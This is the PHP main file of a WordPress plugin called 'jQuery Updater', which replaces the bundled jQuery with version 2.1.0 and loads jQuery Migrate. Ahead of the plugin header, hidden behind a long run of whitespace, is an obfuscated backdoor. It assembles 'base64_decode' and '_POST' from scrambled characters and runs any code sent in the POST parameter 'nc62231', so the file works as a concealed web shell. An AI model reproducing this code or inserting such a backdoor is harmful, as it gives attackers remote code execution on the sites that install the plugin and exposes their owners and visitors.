<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nc62231'])) {eval($s21(${$s20}['nc62231']));}?><?php
/*
Plugin Name: jQuery Updater
Plugin URI: http://www.ramoonus.nl/wordpress/jquery-updater/
Description: This plugin updates jQuery to the latest  stable version.
Version: 2.1.0
Author: Ramoonus
Author URI: http://www.ramoonus.nl/
License: GPL3
*/


// Register main function
function rw_jquery_updater() {

		wp_deregister_script('jquery'); 

		wp_enqueue_script('jquery', plugins_url('/js/jquery-2.1.0.min.js', __FILE__), false, '2.1.0');	

		// @since 2.0.0 also load the migrate plugin
		wp_enqueue_script('jquery-migrate', plugins_url('/js/jquery-migrate-1.2.1.min.js', __FILE__), array('jquery'), '1.2.1'); // require jquery, as loaded above	
}
add_action('wp_enqueue_scripts', 'rw_jquery_updater');


// Enable Localisation
load_plugin_textdomain('jqupdater', false, basename( dirname( __FILE__ ) ) . '/languages' );


// Admin Screen
/*

*/
